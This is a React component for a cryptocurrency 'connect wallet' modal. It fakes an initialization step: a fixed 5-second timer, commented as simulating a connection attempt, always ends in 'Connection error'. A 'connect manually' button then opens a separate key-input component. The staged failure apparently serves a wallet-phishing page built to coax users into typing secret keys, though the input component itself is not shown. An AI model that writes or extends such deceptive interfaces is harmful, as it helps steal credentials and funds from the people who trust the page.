import { MdCancel } from "react-icons/md";
import { Button } from "react-bootstrap";
import { useState, useEffect } from "react";
import './styles.css';
import Inputkey from "./Inputkey";
import MyComponent from "./Canvas";

const Initmodel = ({ setfirstmodal, activesrc }) => {
  const closepop = () => {
    setfirstmodal(false);
  };

  const [showinputkey, setshowinputkey] = useState(false);
  const [inputPlaceholder, setInputPlaceholder] = useState('initializing...');
  const [inputError, setInputError] = useState(false);
  const [showManualButton, setShowManualButton] = useState(false);
  const [isInitializing, setIsInitializing] = useState(true);

  const handleshowkey = () => {
    setshowinputkey(true);
  };

  const startInitializationCycle = () => {
    setTimeout(() => {
      // After initial attempt, go straight to error state
      setInputPlaceholder("Connection error");
      setInputError(true);
      setShowManualButton(true);
      setIsInitializing(false);
    }, 5000); // 5-second delay to simulate connection attempt
  };

  useEffect(() => {
    if (isInitializing) {
      startInitializationCycle();
    }

    return () => clearTimeout(); // Cleanup timeout on unmount
  }, [isInitializing]);

  const inputHolderClass = inputError ? 'inputholderchange' : 'inputholder';

  return (
    <>
      <div className="overlay">
        <div className="innermodal">
          <button onClick={closepop} className="modalbutton">
            <MdCancel size={35} color="white" />
          </button>
          <div className="mainmodalinfo">
            {activesrc && (
              <div className="coindisplayinner">
                <img
                  className="coin-image"
                  src={activesrc.coin.src}
                  alt={activesrc.coin.name}
                />
                <p className="coin-name">{activesrc.coin.name}</p>
              </div>
            )}
            <div className={inputHolderClass}>
              <p className={inputError ? 'placeholder2' : 'placeholder1'}>
                {inputPlaceholder}
              </p>

              {showManualButton && (
                <Button onClick={handleshowkey}>connect manually</Button>
              )}
            </div>
          </div>
          {showinputkey && (
            <Inputkey
              name={activesrc.coin.name}
              imgsrc={activesrc.coin.src}
              setshowinputkey={setshowinputkey}
              setfirstmodal={setfirstmodal}
            />
          )}
        </div>
        <MyComponent />
        <div
          className="overlaycol"
          sx={{ backgroundColor: 'rgba(0, 0, 0, 0.8)', filter: 'blur(150px)' }}
        ></div>
      </div>
    </>
  );
};

export default Initmodel;